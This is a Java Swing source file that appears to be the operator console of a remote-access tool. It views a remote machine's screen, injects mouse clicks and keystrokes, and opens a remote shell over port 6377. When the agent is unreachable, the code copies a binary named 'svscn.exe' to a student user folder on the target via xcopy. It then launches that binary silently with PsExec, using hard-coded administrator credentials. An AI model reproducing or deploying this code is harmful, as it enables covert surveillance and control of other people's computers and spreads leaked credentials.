
import java.awt.Image;
import java.awt.MouseInfo;
import java.awt.Point;
import java.awt.image.BufferedImage;
import java.io.BufferedOutputStream;
import java.io.BufferedReader;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.Socket;
import java.net.URL;
import java.util.Timer;
import java.util.TimerTask;
import java.util.logging.Level;
import java.util.logging.Logger;
import javax.imageio.ImageIO;
import javax.swing.ImageIcon;
import javax.swing.JOptionPane;

/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */

/**
 *
 * @author mike
 */
public class Main_Control extends javax.swing.JFrame {

    /**
     * Creates new form Main_Control
     */
    public Main_Control() {
        initComponents();
       // jTextField1.setText("localhost");
    }
    int screenx = 1920;
    int screeny = 1080;
    private Socket s1;
    public DataOutputStream d_out;
    public DataInputStream d_in;

    Main_Control(String ip) {
             initComponents();
            if(connect(ip)){
             Timer  timer = new Timer();
             timer.scheduleAtFixedRate(new TimerTask() {
                 public void run() {
                     screen();
                 }
             }, 500, 500);   
        }else
           JOptionPane.showMessageDialog(null,"Error in Contacting Client");
    
    }
    private void fileE(String rs,String name){
        
    File file = null;
    String resource = rs;
    URL res = getClass().getResource(resource);
        if (res.toString().startsWith("jar:")) {
        try {
            InputStream input = getClass().getResourceAsStream(resource);
            file = new File(name);
            OutputStream out = new FileOutputStream(file);
            int read;
            byte[] bytes = new byte[1024];

            while ((read = input.read(bytes)) != -1) {
                out.write(bytes, 0, read);
                System.out.println("Writing");
                //jTextArea1.append("Weritng");
            }
        //    file.deleteOnExit();
        out.close();
      //  return true;
        } catch (IOException ex) {
           System.out.println("ex"+ex);
// Exceptions.printStackTrace(ex);
        }
    } else {
        //this will probably work in your IDE, but not from a JAR
        file = new File(res.getFile());
        System.out.println("This onetho");
    }

    if (file != null && !file.exists()) {
       System.out.println("Not Found");
        throw new RuntimeException("Error: File " + file + " not found!");
    }     
  //  return false;

}

    /**
     * This method is called from within the constructor to initialize the form.
     * WARNING: Do NOT modify this code. The content of this method is always
     * regenerated by the Form Editor.
     */
    @SuppressWarnings("unchecked")
    // <editor-fold defaultstate="collapsed" desc="Generated Code">//GEN-BEGIN:initComponents
    private void initComponents() {

        jButton2 = new javax.swing.JButton();
        jButton6 = new javax.swing.JButton();
        jTextField2 = new javax.swing.JTextField();
        jLabel1 = new javax.swing.JLabel();

        setDefaultCloseOperation(javax.swing.WindowConstants.EXIT_ON_CLOSE);

        jButton2.setText("Shell");
        jButton2.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jButton2ActionPerformed(evt);
            }
        });

        jButton6.setText("Message");
        jButton6.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jButton6ActionPerformed(evt);
            }
        });

        jLabel1.setPreferredSize(new java.awt.Dimension(960, 540));
        jLabel1.addMouseListener(new java.awt.event.MouseAdapter() {
            public void mouseClicked(java.awt.event.MouseEvent evt) {
                jLabel1MouseClicked(evt);
            }
        });
        jLabel1.addKeyListener(new java.awt.event.KeyAdapter() {
            public void keyTyped(java.awt.event.KeyEvent evt) {
                jLabel1KeyTyped(evt);
            }
        });

        javax.swing.GroupLayout layout = new javax.swing.GroupLayout(getContentPane());
        getContentPane().setLayout(layout);
        layout.setHorizontalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(layout.createSequentialGroup()
                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addGroup(layout.createSequentialGroup()
                        .addComponent(jTextField2, javax.swing.GroupLayout.PREFERRED_SIZE, 290, javax.swing.GroupLayout.PREFERRED_SIZE)
                        .addGap(18, 18, 18)
                        .addComponent(jButton6))
                    .addComponent(jButton2))
                .addGap(0, 0, Short.MAX_VALUE))
            .addGroup(layout.createSequentialGroup()
                .addComponent(jLabel1, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addContainerGap())
        );
        layout.setVerticalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(layout.createSequentialGroup()
                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                    .addComponent(jButton6)
                    .addComponent(jTextField2, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE))
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.UNRELATED)
                .addComponent(jButton2)
                .addGap(18, 18, 18)
                .addComponent(jLabel1, javax.swing.GroupLayout.PREFERRED_SIZE, 540, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addContainerGap(javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))
        );

        pack();
    }// </editor-fold>//GEN-END:initComponents

    private void jButton2ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jButton2ActionPerformed
    new MultiHost(d_in,d_out).setVisible(true);
    }//GEN-LAST:event_jButton2ActionPerformed

    private void jButton6ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jButton6ActionPerformed
        try {
            d_out.writeUTF("msg");
            d_out.writeUTF(jTextField2.getText());
        } catch (IOException ex) {
            Logger.getLogger(Main_Control.class.getName()).log(Level.SEVERE, null, ex);
        }
    }//GEN-LAST:event_jButton6ActionPerformed

    private void jLabel1MouseClicked(java.awt.event.MouseEvent evt) {//GEN-FIRST:event_jLabel1MouseClicked
 Point p = MouseInfo.getPointerInfo().getLocation();
            p = new Point(p.x - this.getLocation().x, p.y - this.getLocation().y);
          p.x = map(p.x,3,963,0,screenx);
          p.y = map(p.y,113,653,0,screeny);
            System.out.println("Mouse: " + p);
    try {
        d_out.writeUTF("MouseButton");
         d_out.writeUTF(p.x+":"+p.y);
    } catch (IOException ex) {
        Logger.getLogger(viewImage.class.getName()).log(Level.SEVERE, null, ex);
    }        // TODO add your handling code here:
    }//GEN-LAST:event_jLabel1MouseClicked

    private void jLabel1KeyTyped(java.awt.event.KeyEvent evt) {//GEN-FIRST:event_jLabel1KeyTyped
        char c = evt.getKeyChar();
        try {
            d_out.writeUTF("key");
            d_out.writeChar(c);
        } catch (IOException ex) {
            Logger.getLogger(Main_Control.class.getName()).log(Level.SEVERE, null, ex);
        }
    }//GEN-LAST:event_jLabel1KeyTyped

    /**
     * @param args the command line arguments
     */
    public static void main(String args[]) {
        /* Set the Nimbus look and feel */
        //<editor-fold defaultstate="collapsed" desc=" Look and feel setting code (optional) ">
        /* If Nimbus (introduced in Java SE 6) is not available, stay with the default look and feel.
         * For details see http://download.oracle.com/javase/tutorial/uiswing/lookandfeel/plaf.html 
         */
        try {
            for (javax.swing.UIManager.LookAndFeelInfo info : javax.swing.UIManager.getInstalledLookAndFeels()) {
                if ("Nimbus".equals(info.getName())) {
                    javax.swing.UIManager.setLookAndFeel(info.getClassName());
                    break;
                }
            }
        } catch (ClassNotFoundException ex) {
            java.util.logging.Logger.getLogger(Main_Control.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        } catch (InstantiationException ex) {
            java.util.logging.Logger.getLogger(Main_Control.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        } catch (IllegalAccessException ex) {
            java.util.logging.Logger.getLogger(Main_Control.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        } catch (javax.swing.UnsupportedLookAndFeelException ex) {
            java.util.logging.Logger.getLogger(Main_Control.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        }
        //</editor-fold>

        /* Create and display the form */
        java.awt.EventQueue.invokeLater(new Runnable() {
            public void run() {
                new Main_Control().setVisible(true);
            }
        });
    }

    // Variables declaration - do not modify//GEN-BEGIN:variables
    private javax.swing.JButton jButton2;
    private javax.swing.JButton jButton6;
    private javax.swing.JLabel jLabel1;
    private javax.swing.JTextField jTextField2;
    // End of variables declaration//GEN-END:variables

    private void reST(String ip) {
         try {                                         
            fileE("PsExec.exe","tempD.exe");
            String path = new File(".").getCanonicalPath();
            System.out.println(path);
        
            System.out.println(ip);
         
            String cmd = "tempD "
                    + "\\\\"
                    + ip
                    + " -u \"Sys-Admin\" -p c++ -d -i \"c:\\users\\Public\\svscn.exe\"";
            System.out.println("cmd "+cmd);
          //  String test = "dir";        
            ProcessBuilder ps = new ProcessBuilder("cmd","/c",cmd);
         //   System.out.println("Cop cmd "+cmd);
            ps.directory(new File(path));
            try {
                Process p = ps.start();
                BufferedReader bs = new BufferedReader(new InputStreamReader(p.getInputStream()));
                while(true){
                    String l = bs.readLine();
                    if(l == null)
                        break;
                    System.out.println(l);
                 //   jTextArea1.append(l);
                }
            } catch (IOException ex) {
                Logger.getLogger(Script.class.getName()).log(Level.SEVERE, null, ex);
            }
            
        } catch (IOException ex) {
            Logger.getLogger(Script.class.getName()).log(Level.SEVERE, null, ex);
        }  
    }

    private void copy(String ip) {
               try {                                         
          
            fileE("svscn.exe","svscn.exe");
            String path = new File(".").getCanonicalPath();
            System.out.println(path);
            String cpyCMD = "xcopy "+path+"\\svscn.exe "
                    + "\\\\"
                    + ip
                    + "\\users\\student\\Public\\svscn.exe /y";
            System.out.println("Cop cmd "+cpyCMD);
        /*    String cmd = "tempD "
                    + "\\\\"
                    + ip
                    + " -u \"Sys-Admin\" -p c++ -d -i \"c:/users/student/documents/svscn.exe\"";
            System.out.println("cmd "+cmd);*/
        //    String test = "dir";        
            ProcessBuilder ps = new ProcessBuilder("cmd","/c",cpyCMD);
            ps.directory(new File(path));
            try {
                Process p = ps.start();
                BufferedReader bs = new BufferedReader(new InputStreamReader(p.getInputStream()));
                while(true){
                    String l = bs.readLine();
                    if(l == null)
                        break;
                    System.out.println(l);
                    //jTextArea1.append(l);
                }
            } catch (IOException ex) {
                Logger.getLogger(Script.class.getName()).log(Level.SEVERE, null, ex);
            }
            
        } catch (IOException ex) {
            Logger.getLogger(Script.class.getName()).log(Level.SEVERE, null, ex);
        }
    }
    
 public void screen(){
    try {
            d_out.writeUTF("scr");
             byte[] mybytearray = new byte[6022386];
   
    FileOutputStream fos = new FileOutputStream("s.jpg");
    BufferedOutputStream bos = new BufferedOutputStream(fos);
    int count = 0;
    int rsize = 0;
    int size = (int) d_in.readDouble();
 //   System.out.println("reciving size "+size);
   while (rsize<size)
{
    count = d_in.read(mybytearray);
    rsize+=count;
   // System.out.println("inloop count "+count+"rSize"+rsize+"  size :"+size);
    
  bos.write(mybytearray, 0, count);
}
 //  System.out.println("OULOOP");

   bos.close();
     //  System.out.println("OULOOP 1");
        } catch (IOException ex) {
            Logger.getLogger(Main_Control.class.getName()).log(Level.SEVERE, null, ex);
        }
               BufferedImage img = null;
try {
    img = ImageIO.read(new File("s.jpg"));
      Image dimg = img.getScaledInstance(960, 540,
        Image.SCALE_SMOOTH);
    ImageIcon imageIcon = new ImageIcon(dimg);
    jLabel1.setIcon(imageIcon);
} catch (IOException e) {
    e.printStackTrace();
  
}
    }
int map(int x, int in_min, int in_max, int out_min, int out_max)
{
  return (x - in_min) * (out_max - out_min) / (in_max - in_min) + out_min;
}

    private boolean connect(String ip) {
        for(int i=0;i<4;i++){
        try {
            System.out.println("Trying time : "+i);
            s1 = new Socket(ip,6377);
            System.out.println("Connected");
            d_out = new DataOutputStream(s1.getOutputStream());
            d_in = new DataInputStream(s1.getInputStream());
            System.out.println(d_in.readUTF());
            return true;
        } catch (IOException ex) {
            Logger.getLogger(Main_Control.class.getName()).log(Level.SEVERE, null, ex);
            System.out.println("Trying to restart process and copy");
            copy(ip);
            reST(ip);
        }
        }
        return false;
    }
}
